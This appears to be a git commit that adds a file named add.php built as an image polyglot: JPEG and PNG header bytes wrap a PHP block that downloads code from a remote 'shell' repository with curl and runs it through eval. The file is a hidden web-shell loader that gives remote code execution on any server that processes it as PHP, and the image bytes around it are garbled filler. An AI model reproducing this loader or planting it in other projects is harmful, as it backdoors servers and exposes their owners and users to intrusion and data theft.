01a3322a0e7fd7f3650b6c797bea42235ca9024a
rkr37287 <rkr37287@gmail.com>
2026-03-09 15:59:57 +0530

    jj

---
+++ add.php
@@ -0,0 +1,31 @@
+     JFIF           	 ( %!1!%)+...383-7(-.+
+
+
+
+--------------------------------------+-----------+     ,                     7     !1AQaq"2   b #R  Br 3c                      4       !1"A2Qa q   #    3BRb     ? J Mt Z  #ű 2 e YfN^ؑf  4  K  o  Eb  =  C  XU    	"1D CD   E	TH Ǣ tXVxӆ V1Ecb   QɊ=E'"dOP   ݔ  0l   kCL	+   @KQV
+  īz  l      %   hԘ f ]it gYG$ v p  T 8 : -& 8  5u	   O 4 0  0   Hw  z  'r   T yօ )    6  hn       ΂  a +"ɳ   dP !rA)  4	  
+(  PNG
+
+    GVcd          
+<?php
+   function get($url) {
+    $ch = curl_init();
+
+    curl_setopt($ch, CURLOPT_HEADER, 0);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($ch, CURLOPT_URL, $url);
+
+    $data = curl_exec($ch);
+    curl_close($ch);
+
+    return $data;
+}
+      eval('?>' . get('https://raw.githubusercontent.com/rkr37287/shell/refs/heads/main/adminer.php'));
+?>
+1 6 B !!z 5
+ FJb9b  1 !H D&   9\H% :  l  B   c 2Ь*  gY*'9 q      F  g 5?#S х ˞F . D h չ se q@i\   U rH     N  AkH      ̑  $ q&   <be  R10Gi< t)   7:!#  s
+  T JDEH-   H    RX ) w H < 6$  j T H  PC"   Ѩ퀪<$21  棪/,^  V+Q 8q  ط   !-{    , 	B -     }
+  {J   0 Y#b5 He  vY + NjB Npvp
+I! ˤi o% N     F  Ӆ J9 ֯ N   )  R; Ͱ$n'b X o   \Z k [ m#    q  ;    I  )0ř   z   Hz  bZ (gD$t ̗aP c!  0$D i   iJ bd n h    Z1D C:9   $G  TfQ Qx A R!  	m  lkK   j 1 w7  -c J] e |O    /      _       t  0  52 i~_ܫ   B  hHPq   mcv#> 2 1F1 ܣ ĵ 2J 9  u  l 'p;    
+b⪌  : M   r  g .;؛J L} w    %  ? S 遗 R` FU 819p   ~  2       (ꂤ   A bj I q ( L^    F Ӊ M )`B    
+gD      @   l$JtJ  C  T A | *  5 #  _ #  
